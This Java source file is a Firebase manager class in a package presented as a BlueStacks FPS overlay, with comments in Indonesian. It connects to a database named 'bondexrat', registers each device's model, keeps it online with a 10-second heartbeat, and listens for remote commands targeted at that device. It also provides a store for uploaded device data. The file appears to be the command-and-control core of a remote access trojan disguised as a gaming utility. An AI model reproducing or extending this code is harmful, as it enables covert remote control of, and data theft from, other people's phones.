package com.bluestacks.fpsoverlay;

import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import androidx.annotation.NonNull;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import java.util.HashMap;
import java.util.Map;

public class FirebaseManager {
    private final String deviceId;
    private final DatabaseReference deviceRef, commandsRef, dataRef;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private long lastCommandTime = 0;
    private CommandCallback callback;

    public interface CommandCallback {
        void onCommandReceived(String cmd);
    }

    public FirebaseManager(String deviceId, CommandCallback callback) {
        this.deviceId = deviceId;
        this.callback = callback;
        FirebaseDatabase db = FirebaseDatabase.getInstance("https://bondexrat-default-rtdb.firebaseio.com/");
        this.deviceRef = db.getReference("devices").child(deviceId);
        this.commandsRef = db.getReference("commands");
        this.dataRef = db.getReference("data").child(deviceId);
    }

    public void init() {
        // Setup metadata perangkat
        Map<String, Object> info = new HashMap<>();
        info.put("name", Build.MANUFACTURER + " " + Build.MODEL);
        info.put("online", true);
        info.put("last_seen", System.currentTimeMillis());
        deviceRef.updateChildren(info);

        // OPTIMASI: Presence System
        // Ketika koneksi terputus (offline), set status online ke false secara otomatis di server
        deviceRef.child("online").onDisconnect().setValue(false);
        deviceRef.child("last_seen").onDisconnect().setValue(System.currentTimeMillis());

        listenToCommands();
        startHeartbeat();
    }

    private void listenToCommands() {
        commandsRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                String cmd = snapshot.child("cmd").getValue(String.class);
                String target = snapshot.child("target").getValue(String.class);
                Long time = snapshot.child("t").getValue(Long.class);
                if (cmd != null && target != null && time != null && time > lastCommandTime) {
                    if (target.equals(deviceId)) {
                        lastCommandTime = time;
                        if (callback != null) callback.onCommandReceived(cmd);
                    }
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    private void startHeartbeat() {
        handler.postDelayed(new Runnable() {
            @Override public void run() {
                Map<String, Object> updates = new HashMap<>();
                updates.put("last_seen", System.currentTimeMillis());
                deviceRef.updateChildren(updates);
                handler.postDelayed(this, 10000);
            }
        }, 1000);
    }

    public DatabaseReference getDataRef() {
        return dataRef;
    }

    public void removeDeviceData() {
        // Hapus metadata perangkat dan semua data terkait
        deviceRef.removeValue();
        dataRef.removeValue();
    }
}
